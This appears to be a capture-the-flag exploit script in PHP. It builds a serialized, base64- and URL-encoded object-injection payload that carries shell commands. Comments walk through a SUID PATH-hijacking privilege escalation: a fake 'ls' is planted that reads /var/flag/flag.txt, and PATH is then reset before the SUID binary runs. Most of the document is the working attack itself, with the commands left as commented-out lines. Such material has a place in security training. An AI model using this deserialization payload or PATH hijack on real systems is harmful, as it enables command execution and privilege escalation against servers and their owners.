<?php
// SUID privlege escalation
// The list_cat binary is a SUID binary that runs the ls command.
// ls is a command that depends on the PATH environment variable to find the ls binary.
//  We can exploit this by changing the PATH environment variable to include the directory where the list_cat binary is located.
// Then, we can make the list_cat binary run the cat command with the /var/flag/flag.txt file as an argument.
// It should be noted that in php, environment variables are not shared between different processes.
// Therefore, we need to export the PATH environment variable in the same command that runs the list_cat binary.
class Cat {
    public $admin;
    public $name;
    public $command;
    public function __construct($file) {
        $this->command = $file;
    }


}



// $command = ["bash","-c", "echo '/usr/bin/cat /var/flag/flag.txt' > ls && chmod +x ls"]; //Run this command first
// $command = ["bash","-c", "export PATH='/var/www/html/backend' && /usr/bin/list_cat"];
$process = new Cat($command);
$sercat = serialize($process);
$b64cat = base64_encode($sercat);
$uriEncoded = urlencode($b64cat);

echo $uriEncoded;
?>